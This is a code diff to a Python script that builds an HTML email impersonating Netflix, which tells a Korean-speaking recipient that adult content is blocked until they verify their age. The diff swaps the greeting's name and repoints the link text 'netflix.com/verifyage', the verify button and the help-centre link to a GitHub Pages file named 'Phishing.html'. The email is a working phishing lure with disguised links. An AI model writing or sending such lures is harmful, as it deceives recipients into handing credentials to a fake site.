@@ -54,12 +54,12 @@ html_content = """
         <h1 style="font-size: 35px; color: #333; margin-bottom: 10px">
           연령을 인증해 주세요
         </h1>
-        <p style="font-size: 16px; color: #555">아림 님, 안녕하세요.</p>
+        <p style="font-size: 16px; color: #555">장원 님, 안녕하세요.</p>
         <p style="font-size: 16px; color: #555">
           현재 연령 인증 시스템 도입으로 인해 Netflix에서 성인 등급의 동영상
           시청이 제한되어 있습니다.
           <a
-            href="https://ahrim13.github.io/Netflix-Age-Verify/fishing.html"
+            href="https://ahrim13.github.io/Netflix-Age-Verify/Phishing.html"
             style="color: #e60914; text-decoration: none"
             >netflix.com/verifyage</a
           >
@@ -69,7 +69,7 @@ html_content = """
         <!-- 인증하기 Button -->
         <div style="text-align: center; margin: 20px 0">
           <a
-            href="https://ahrim13.github.io/Netflix-Age-Verify/fishing.html"
+            href="https://ahrim13.github.io/Netflix-Age-Verify/Phishing.html"
             style="
               display: inline-block;
               background-color: #e50914;
@@ -104,7 +104,7 @@ html_content = """
 
         <p style="font-size: 16px; color: #555">
           도움이 필요하시면 언제든지 도와드리겠습니다.
-          <a href="fishing.html" style="color: #e50914; text-decoration: none"
+          <a href="https://ahrim13.github.io/Netflix-Age-Verify/Phishing.html" style="color: #e50914; text-decoration: none"
             >고객 센터</a
           >
           페이지에서 자세한 정보를 확인하시거나 직접 문의해 주세요.
@@ -153,7 +153,6 @@ html_content = """
     </div>
   </body>
 </html>
-
 """
 
 # 이메일 메시지 생성
